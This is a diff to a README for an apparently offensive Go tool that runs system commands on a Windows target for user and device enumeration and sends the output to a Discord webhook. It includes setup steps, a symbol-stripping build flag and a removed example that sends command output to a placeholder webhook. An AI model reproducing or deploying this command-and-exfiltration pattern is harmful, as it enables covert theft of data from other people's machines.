@@ -13,13 +13,13 @@ A simple Go application that executes system commands, for user and device enume
 
 - Go installed on your system
 - A Discord webhook URL
-- Windows operating system (for current implementation)
+- Windows operating system (for current implementation) for the target host
 
 ## Installation
 
 1. Clone the repository.
 2. Navigate to the project directory.
-3. Replace `<ENTERWEBHOOKURL>` with your actual Discord webhook's URL.
+3. Replace `<ENTERWEBHOOKURL>` with your actual Discord webhook's URL. (Line 55)
 3. Run `go build -ldflags "-s -w" main.go` to compile.
 
 ## Usage
@@ -31,16 +31,8 @@ The application provides two main functions:
 
 *Note: If you want to make this run on a Linux host, change `exec.Command("cmd", "/C", cmd)` to `exec.Command("bash", "-c", cmd)` on Line 19.*
 
-Example usage in code:
+## Examples
 
-```go
-output, err := runCommand("dir")
-if err != nil {
-    log.Fatal(err)
-}
+![1_iV_kbfBYECMoMNtsOoh8yw](https://github.com/user-attachments/assets/3bd9e55f-3a91-447a-a1e7-757033c531e8)
 
-err = sendToDiscord("your-webhook-url", output)
-if err != nil {
-    log.Fatal(err)
-}
-
+![1_JDYFWDr0CtQtBTn5sP23UQ](https://github.com/user-attachments/assets/4bec2c85-2bd9-4ade-896e-459ab3e65eb7)
